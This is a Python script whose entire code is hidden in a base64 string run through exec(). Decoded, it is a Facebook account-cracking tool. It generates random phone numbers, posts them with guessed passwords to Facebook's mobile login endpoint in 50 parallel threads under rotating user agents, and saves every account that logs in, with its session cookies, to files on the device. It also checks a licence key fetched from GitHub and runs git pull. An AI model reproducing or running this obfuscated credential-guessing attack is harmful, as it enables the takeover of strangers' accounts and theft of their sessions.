import base64
exec(base64.b64decode("IyBGYWNlYm9vazogQkQgSkFISUVEDQojIEdpdGh1YjogQkxBQ0stSFVOVEVSLVRFQU0NCmltcG9ydCBvcyxzeXMsdGltZSxqc29uLHJhbmRvbSxyZSxzdHJpbmcscGxhdGZvcm0sYmFzZTY0LHV1aWQNCm9zLnN5c3RlbSgiZ2l0IHB1bGwiKQ0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXAgYXMgc29wDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cA0KaW1wb3J0IHJlcXVlc3RzIGFzIHJlc3MNCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGUNCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lDQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwDQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwIGFzIHdha3R1DQp0cnk6DQogICAgaW1wb3J0IHJlcXVlc3RzDQogICAgZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyBUaHJlYWRQb29sDQogICAgaW1wb3J0IG1lY2hhbml6ZQ0KICAgIGZyb20gcmVxdWVzdHMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkVycm9yDQpleGNlcHQgTW9kdWxlTm90Rm91bmRFcnJvcjoNCiAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIG1lY2hhbml6ZSByZXF1ZXN0cyBmdXR1cmVzIGJzND09MiA+IC9kZXYvbnVsbCcpDQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBiczQnKQ0KICAgIA0KDQogICAgICAgICAgICANCiAgICAgICAgICAgIA0KDQpjbGFzcyBqYWxhbjoNCiAgICBkZWYgX19pbml0X18oc2VsZiwgeik6DQogICAgICAgIGZvciBlIGluIHogKyAiXG4iOg0KICAgICAgICAgICAgc3lzLnN0ZG91dC53cml0ZShlKQ0KICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDA5KQ0KICAgICAgICAgICAgDQpQID0gJ1x4MWJbMTs5N20nDQpNID0gJ1x4MWJbMTs5MW0nDQpIID0gJ1x4MWJbMTs5Mm0nDQpLID0gJ1x4MWJbMTs5M20nDQpCID0gJ1x4MWJbMTs5NG0nDQpVID0gJ1x4MWJbMTs5NW0nIA0KTyA9ICdceDFiWzE7OTZtJw0KTiA9ICdceDFiWzBtJyAgICANClogPSAiXDAzM1sxOzMwbSINCnNpciA9ICdcMDMzWzQxbVx4MWJbMTs5N20nDQp4ID0gJ1wzM1ttJyAjIERFRkFVTFQNCm0gPSAnXHgxYlsxOzkxbScgI1JFRCArDQprID0gJ1wwMzNbOTNtJyAjIEtVTklORyArDQp4ciA9ICdceDFiWzE7OTJtJyAjIEhJSkFVICsNCmhoID0gJ1wwMzNbMzJtJyAjIEhJSkFVIC0NCnUgPSAnXDAzM1s5NW0nICMgVU5HVQ0Ka2sgPSAnXDAzM1szM20nICMgS1VOSU5HIC0NCmIgPSAnXDMzWzE7OTZtJyAjIEJJUlUgLQ0KcCA9ICdceDFiWzA7MzRtJyAjIEJJUlUgKw0KYXN1ID0gcmFuZG9tLmNob2ljZShbbSxrLHhyLHUsYl0pDQpteV9jb2xvciA9IFsNCiBQLCBNLCBILCBLLCBCLCBVLCBPLCBOXQ0Kd2FybmEgPSByYW5kb20uY2hvaWNlKG15X2NvbG9yKQ0Kbm93ID0gZGF0ZXRpbWUubm93KCkNCmR0X3N0cmluZyA9IG5vdy5zdHJmdGltZSgiJUg6JU0iKQ0KY3VycmVudCA9IGRhdGV0aW1lLm5vdygpDQp0YSA9IGN1cnJlbnQueWVhcg0KYnUgPSBjdXJyZW50Lm1vbnRoDQpoYSA9IGN1cnJlbnQuZGF5DQp0b2RheSA9IGRhdGUudG9kYXkoKQ0KbG9nbyA9IiIiDQpcMDMzWzkzOzFtICBfX19fICAgICAgICBfICAgIF8gICBfX19fX19fIF9fX19fXyAgICAgICAgICBfXyAgX18gDQpcMDMzWzE7MzJtIHwgIF8gXCAgICAgIHwgfCAgfCB8IHxfXyAgIF9ffCAgX19fX3wgICAvXCAgIHwgIFwvICB8DQpcMDMzWzkxOzFtIHwgfF8pIHxfX19fX3wgfF9ffCB8ICAgIHwgfCAgfCB8X18gICAgIC8gIFwgIHwgXCAgLyB8DQpcMDMzWzk1OzFtIHwgIF8gPF9fX19fX3wgIF9fICB8ICAgIHwgfCAgfCAgX198ICAgLyAvXCBcIHwgfFwvfCB8DQpcMDMzWzk0OzFtIHwgfF8pIHwgICAgIHwgfCAgfCB8ICAgIHwgfCAgfCB8X19fXyAvIF9fX18gXHwgfCAgfCB8DQpcMDMzWzkzOzFtIHxfX19fLyAgICAgIHxffCAgfF98ICAgIHxffCAgfF9fX19fXy9fLyAgICBcX1xffCAgfF98IA0KDQpcMzNbMTszMm09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpcMDMzWzE7OTVtW1wwMzNbMTs5M21bPl1cMDMzWzE7OTVtXVwwMzNbMTs5M20gQVVUSE9SICBcMDMzWzE7OTFtIDogXDAzM1sxOzk1bVpBSElEIEhVU1NBSU4NClwwMzNbMTs5NW1bXDAzM1sxOzkzbVs+XVwwMzNbMTs5NW1dXDAzM1sxOzkzbSBGQUNFQk9PS1wwMzNbMTs5MW0gOiBcMDMzWzE7OTVtWkFISUQgSFVTU0FJTg0KXDAzM1sxOzk1bVtcMDMzWzE7OTNtWz5dXDAzM1sxOzk1bV1cMDMzWzE7OTNtIEdJVEhVQiAgXDAzM1sxOzkxbSA6IFwwMzNbMTs5NW1CTEFDSy1IVU5URVItVEVBTQ0KXDAzM1sxOzk1bVtcMDMzWzE7OTNtWz5dXDAzM1sxOzk1bV1cMDMzWzE7OTNtIFRPT0xTICAgXDAzM1sxOzkxbSA6IFwwMzNbMTs5NW1SQU5ET00gTUlYDQpcMDMzWzE7OTVtW1wwMzNbMTs5M21bPl1cMDMzWzE7OTVtXVwwMzNbMTs5M20gVkVSU0lPTiBcMDMzWzE7OTFtIDogXDAzM1sxOzkxbTEuOS44DQpcMzNbMTszMm09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IiIiDQp0cnk6DQogICAga2V5MT1vcGVuKCIvc3RvcmFnZS9lbXVsYXRlZC8wL2FuZHJvaWQ4LnR4dCIsJ3InKS5yZWFkKCkNCmV4Y2VwdCBJT0Vycm9yOg0KICAgIGtvaz1vcGVuKCIvc3RvcmFnZS9lbXVsYXRlZC8wL2FuZHJvaWQ4LnR4dCIsJ3cnKQ0KICAgIG15aWQ9dXVpZC51dWlkNCgpLmhleFs6MTJdDQogICAgZj0iQ09CUkEtTElOVVgiDQogICAga2V5PW15aWQrZg0KICAgIGtvay53cml0ZShrZXkpDQogICAga29rLmNsb3NlKCkNCiAgICBwcmludChrZXkpDQoNCmE9cmVxdWVzdHMuZ2V0KCJodHRwczovL2dpdGh1Yi5jb20vamFoaWVkL0VDLTE3MC9ibG9iL21haW4vUmFuZG9uLW1peC50eHQiKS50ZXh0DQpiPXN0cihhKQ0Ka2V5MT1vcGVuKCIvc3RvcmFnZS9lbXVsYXRlZC8wL2FuZHJvaWQ4LnR4dCIsJ3InKS5yZWFkKCkNCmtleTI9c3RyKGtleTEpICANCmlmIGtleTIgaW4gYjoNCiAgICBwYXNzDQogICAgDQplbHNlOg0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIHByaW50DQogICAgcHJpbnQoIllvdXIga2V5ICA6ICIra2V5MikNCiAgICBwcmludCgiXG5cdFx0Q29udGFjdCBBZG1pbiAiKQ0KICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93YS5tZS8rODgwMTc0Nzk1MTE2OScpDQogICAgZXhpdCgpDQpsb29wID0gMA0Kb2tzID0gW10NCmNwcyA9IFtdDQoNCmRlZiBjbGVhcigpOg0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIHByaW50KGxvZ28pDQpmcm9tIHRpbWUgaW1wb3J0IGxvY2FsdGltZSBhcyBsdA0KZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIGNtZA0KbHR4ID0gaW50KGx0KClbM10pDQppZiBsdHggPiAxMjoNCiAgICBhID0gbHR4LTEyDQogICAgdGFnID0gIlBNIg0KZWxzZToNCiAgICBhID0gbHR4DQogICAgdGFnID0gIkFNIg0KICAgIA0KICAgIA0KdHJ5Og0KICAgIHByaW50KCdcblxuXDAzM1sxOzMzbUxvYWRpbmcgYXNzZXQgZmlsZXMgLi4uIFwwMzNbMDs5N20nKQ0KICAgIHYgPSA1LjINCiAgICB1cGRhdGUgPSAoJzUuMicpDQogICAgdXBkYXRlID0gKCc1LjInKQ0KICAgIGlmIHN0cih2KSBpbiB1cGRhdGU6DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIGVsc2U6cGFzcw0KZXhjZXB0OnByaW50KCdcblwwMzNbMTszMW1ObyBpbnRlcm5ldCBjb25uZWN0aW9uIC4uLiBcMDMzWzA7OTdtJykNCiNnbG9iYWwgZnVuY3Rpb25zDQpkZWYgZHluYW1pYyh0ZXh0KToNCiAgICB0aXRpayA9IFsnLiAgICcsJy4uICAnLCcuLi4gJywnLi4uLiAnXQ0KICAgIGZvciBvIGluIHRpdGlrOg0KICAgICAgICBwcmludCgnXHInK3RleHQrbyksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKTt0aW1lLnNsZWVwKDEpDQoNCiNVc2VyIGFnZW50cw0KdWdlbjI9W10NCnVnZW49W10NCiANCmZvciB4ZCBpbiByYW5nZSgxMDAwMCk6DQogICAgYWE9J01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCcNCiAgICBiPXJhbmRvbS5jaG9pY2UoWyczJywnNCcsJzUnLCc2JywnNycsJzgnLCc5JywnMTAnLCcxMScsJzEyJywnMTMnLCcxNCcsJzE1JywnMTYnLCcxNyddKQ0KICAgIGM9JyBlbi11czsgR1QtJw0KICAgIGQ9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pDQogICAgZT1yYW5kb20ucmFuZHJhbmdlKDEsIDk5OSkNCiAgICBmPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQ0KICAgIGc9J0FwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8nDQogICAgaD1yYW5kb20ucmFuZHJhbmdlKDczLDEwMCkNCiAgICBpPScwJw0KICAgIGo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApDQogICAgaz1yYW5kb20ucmFuZHJhbmdlKDQwLDE1MCkNCiAgICBsPSdNb2JpbGUgU2FmYXJpLzUzNy4zNicNCiAgICB1YWt1Mj0oZid7YWF9IHtifTsge2N9e2R9e2V9e2Z9KSB7Z317aH0ue2l9LntqfS57a30ge2x9JykNCiAgICB1Z2VuLmFwcGVuZCh1YWt1MikNCiAgICANCiMgQVBLIENIRUNLDQpkZWYgeHhyKCk6DQogICAgdXNlcj1bXQ0KICAgIHR3ZiA9W10NCiAgICBvcy5nZXR1aWQNCiAgICBvcy5nZXRldWlkDQogICAgb3Muc3lzdGVtKCJjbGVhciIpDQogICAgcHJpbnQobG9nbykNCiAgICBwcmludChmJyBbe3hyfV57eH1dIEV4YW1wbGU+OiB7eHJ9MDE5LDAxNywwMTgsOTIzMDIsOTIzMDEsOTE3Nzh7eH0nKQ0KICAgIHByaW50KCIg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQIikNCiAgICByazEgPSAnMDE3MScNCiAgICByazIgPSAnMDE3MTgnDQogICAgcmszID0gJys2MzMxJw0KICAgIHJrNCA9ICcwMTcnDQogICAgcms1ID0gJzAxOTEnDQogICAgcms2ID0gJzAxNScNCiAgICByazcgPSAnMDE5NScNCiAgICByazggPSAnMDE5Jw0KICAgIHJrOSA9ICcwMTgnDQogICAgcmsxMCA9ICcwMTgxJw0KICAgIHJrMTEgPSAnMDE2Jw0KICAgIHJrMTIgPSAnMDE2MScNCiAgICByazEzID0gJys5MjMwJw0KICAgIHJrMTQgPSAnKzkxNzcnDQogICAgY29kZSA9IHJhbmRvbS5jaG9pY2UoW3JrMSxyazIscmszLHJrNCxyazUscms2LHJrNyxyazgscms5LHJrMTAscmsxMSxyazEyLHJrMTMscmsxNCxdKSAgICAgICAgICAgICAgICAgICAgICAjIGlucHV0KGYnIFt7eHJ94page3h9XSBDaG9vc2UgOiAnKQ0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIHByaW50KGxvZ28pDQogICAgbGltaXQgPSBpbnQoaW5wdXQoZidcMDMzWzA7OTdtW3t4cn1ee3h9XVwwMzNbMDs5Mm0gRVhBTVBMRSA6IFwwMzNbMDs5M20xMDAwMCwgXHgxYlszODswOzk2bTIwMDAwLCBcMDMzWzA7OTJtNTAwMDAgXSBcblwwMzNbMDs5M23ilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAgXG5cMDMzWzA7OTZtW3t4cn1ee3h9XSBcMDMzWzA7OTJtUFVUIENMT05JTkcgTElNSVQ6XDAzM1swOzkzbSAnKSkNCiAgICBmb3Igbm1iciBpbiByYW5nZShsaW1pdCk6DQogICAgICAgIG5tcCA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuZGlnaXRzKSBmb3IgXyBpbiByYW5nZSg3KSkNCiAgICAgICAgdXNlci5hcHBlbmQobm1wKQ0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIHByaW50KGxvZ28pDQogICAgcGFzc3ggPSAwDQogICAgSGFtaWlJRCA9IFtdDQogICAgcHJpbnQoIiIpDQogICAgZm9yIGJpbGFsIGluIHJhbmdlKHBhc3N4KToNCiAgICAgICAgcHd3ID0gaW5wdXQoZiJbKl0gRW50ZXIgUGFzc3dvcmQge2JpbGFsKzF9IDogIikNCiAgICAgICAgSGFtaWlJRC5hcHBlbmQocHd3KQ0KICAgIHdpdGggVGhyZWFkUG9vbChtYXhfd29ya2Vycz01MCkgYXMgbWFuc2hlcmE6DQogICAgICAgIGNsZWFyKCkNCiAgICAgICAgdGwgPSBzdHIobGVuKHVzZXIpKQ0KICAgICAgICBqYWxhbignXDAzM1sxOzk3bT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KICAgICAgICBqYWxhbihmJ1t7eHJ9Xnt4fV1ceDFiWzM4OzU7MjA4bSBZT1VSIFRPVEFMIElEUzoge3hyfScrdGwpDQogICAgICAgIGphbGFuKGYne3h9W3t4cn1ee3h9XVwwMzNbMDs5Mm0gUExFQVNFIFdBSVQgWU9VUiBDTE9OSU5HIFBST0NFU1MgSEFTIEJFRU4gU1RBUlRFRCcpDQogICAgICAgIGphbGFuKGYnXDAzM1swOzk3bVt7eHJ9Xnt4fV1cMDMzWzA7OTZtIFVTRSBZT1VSIE1PQklMRSBEQVRBICcpDQogICAgICAgIGphbGFuKGYnXDAzM1swOzk3bVt7eHJ9Xnt4fV0gXHgxYlszMzswOzk0bVVzZSBGbGlnaHQgTW9kZSBGb3IgU3BlZWQgVXAnKQ0KICAgICAgICBqYWxhbihmJ1wwMzNbMDs5N21be3hyfV57eH1dIFwwMzNbMDs5Mm1TdXBlciBGYXN0IFNwZWVkIENsb25pbmcnKQ0KICAgICAgICBqYWxhbignXDAzM1sxOzk3bT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0nKQ0KICAgICAgICBmb3IgbG92ZSBpbiB1c2VyOg0KICAgICAgICAgICAgcHd4ID0gW2xvdmVbMTpdXQ0KICAgICAgICAgICAgdWlkID0gY29kZStsb3ZlDQogICAgICAgICAgICBmb3IgRW1hbiBpbiBIYW1paUlEOg0KICAgICAgICAgICAgICAgIHB3eC5hcHBlbmQoRW1hbikNCiAgICAgICAgICAgICAgICBwd3guYXBwZW5kKGxvdmUpDQogICAgICAgICAgICBtYW5zaGVyYS5zdWJtaXQocmNyYWNrLHVpZCxwd3gsdGwpDQogICAgcHJpbnQoZiJcbnt4fSDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAiKQ0KZGVmIHJjcmFjayh1aWQscHd4LHRsKToNCiAgICAjcHJpbnQodXNlcikNCiAgICBnbG9iYWwgbG9vcA0KICAgIGdsb2JhbCBjcHMNCiAgICBnbG9iYWwgb2tzDQogICAgZ2xvYmFsIHByb3h5DQogICAgdHJ5Og0KICAgICAgICBmb3IgcHMgaW4gcHd4Og0KICAgICAgICAgICAgcHJvID0gcmFuZG9tLmNob2ljZSh1Z2VuKQ0KICAgICAgICAgICAgc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KICAgICAgICAgICAgZnJlZV9mYiA9IHNlc3Npb24uZ2V0KCdodHRwczovL20uZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLz9uZXh0PWh0dHBzJTNBJTJGJTJGZGV2ZWxvcGVycy5mYWNlYm9vay5jb20lMkZ0b29scyUyRmRlYnVnJTJGJmFtcDtyZWZzcmM9ZGVwcmVjYXRlZCZhbXA7bHd2PTEwMCcpLnRleHQNCiAgICAgICAgICAgIGxvZ19kYXRhID0gew0KICAgICAgICAgICAgICAgICJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgIm1fdHMiOnJlLnNlYXJjaCgnbmFtZT0ibV90cyIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAibGkiOnJlLnNlYXJjaCgnbmFtZT0ibGkiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgInRyeV9udW1iZXIiOiIwIiwNCiAgICAgICAgICAgICJ1bnJlY29nbml6ZWRfdHJpZXMiOiIwIiwNCiAgICAgICAgICAgICJlbWFpbCI6dWlkLA0KICAgICAgICAgICAgInBhc3MiOnBzLA0KICAgICAgICAgICAgImxvZ2luIjoiTG9nIEluIn0NCiAgICAgICAgICAgIGhlYWRlcl9mcmVlZmIgPSB7ImF1dGhvcml0eSI6ICdtYmFzaWMuZmFjZWJvb2suY29tJywNCiAgICAgICAgICAgICJtZXRob2QiOiAnR0VUJywNCiAgICAgICAgICAgICJzY2hlbWUiOiAnaHR0cHMnLA0KICAgICAgICAgICAgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjknLA0KICAgICAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCcsDQogICAgICAgICAgICAnY2FjaGUtY29udHJvbCc6ICdtYXgtYWdlPTAnLA0KICAgICAgICAgICAgIyAnY29va2llJzogJ2RhdHI9endhaVk4b0lwUkptdXNmd2NVWVIzZ2NsOyBzYj16d2FpWTVYS0k2ZFl2ZGlBVDhNZklBekY7IHdkPTk3OXgxODMxOyBkcHI9Mi4zNDM3NTsgZnI9MEZHRmdEY0QyeDNNU1BFYkouLkJqb2diUC5GaC5BQUEuMC4wLkJqdDdqcS5BV1h2ZWdocC1BSScsDQogICAgICAgICAgICAnc2VjLWNoLXVhJzogJyJDaHJvbWl1bSI7dj0iMTA3IiwgIk5vdD1BP0JyYW5kIjt2PSIyNCInLA0KICAgICAgICAgICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzEnLA0KICAgICAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciQW5kcm9pZCInLA0KICAgICAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2RvY3VtZW50JywNCiAgICAgICAgICAgICdzZWMtZmV0Y2gtbW9kZSc6ICduYXZpZ2F0ZScsDQogICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnbm9uZScsDQogICAgICAgICAgICAnc2VjLWZldGNoLXVzZXInOiAnPzEnLA0KICAgICAgICAgICAgJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOiAnMScsDQogICAgICAgICAgICAndXNlci1hZ2VudCc6IHByb30NCiAgICAgICAgICAgIGxvID0gc2Vzc2lvbi5wb3N0KCdodHRwczovL20uZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLz9uZXh0PWh0dHBzJTNBJTJGJTJGZGV2ZWxvcGVycy5mYWNlYm9vay5jb20lMkZ0b29scyUyRmRlYnVnJTJGJmFtcDtyZWZzcmM9ZGVwcmVjYXRlZCZhbXA7bHd2PTEwMCcsZGF0YT1sb2dfZGF0YSxoZWFkZXJzPWhlYWRlcl9mcmVlZmIpLnRleHQNCiAgICAgICAgICAgIGxvZ19jb29raWVzPXNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLmtleXMoKQ0KICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gbG9nX2Nvb2tpZXM6DQogICAgICAgICAgICAgICAgY29raT0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpLml0ZW1zKCldKQ0KICAgICAgICAgICAgICAgIGNpZCA9IGNva2lbNzoyMl0NCiAgICAgICAgICAgICAgICBwcmludCgnXHJcclwwMzNbMTszMm1bQkhULU9L8J+Sml0gJyArdWlkKyAnIHwgJyArcHMrICAgICcgIFxuW+KAjuKAjvCfmI1dXDAzM1swOzkzbSBDT09LSUUgPSBcMDMzWzE7MzJtJytjb2tpKyAgJyAgJycgIFwwMzNbMDs5N20nKQ0KICAgICAgICAgICAgICAgIGNla19hcGsoc2Vzc2lvbixjb2tpKQ0KICAgICAgICAgICAgICAgIG9wZW4oJy9zZGNhcmQvQkhULU9LLnR4dCcsICdhJykud3JpdGUoIHVpZCsnIHwgJytwcysnXHknKQ0KICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQodWlkKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICBlbGlmICdjaGVja3BvaW50JyBpbiBsb2dfY29va2llczoNCiAgICAgICAgICAgICAgICBjb2tpPSI7Ii5qb2luKFtrZXkrIj0iK3ZhbHVlIGZvciBrZXksdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgY2lkID0gY29raVsyNDozOV0NCiAgICAgICAgICAgICAgICAjcHJpbnQoJ1xyXHJcMzNbMTszMG1bQkhULUNQXSAnICt1aWQrICcgfCAnICtwcysgICAgICAgICAgICcgIFwzM1swOzk3bScpDQogICAgICAgICAgICAgICAgb3BlbignL3NkY2FyZC9SQUpVLUNQLnR4dCcsICdhJykud3JpdGUoIHVpZCsnIHwgJytwcysnIFxuJykNCiAgICAgICAgICAgICAgICBjcHMuYXBwZW5kKGNpZCkNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICBsb29wKz0xDQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZidcclxyJXN7eH1be3hyfUJILVRFQU17eH1dWyVzfCVzXVtPSzp7eHJ9JXN7eH1dJyUoSCxsb29wLHRsLGxlbihva3MpKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0KDQp4eHIoKQ0K"))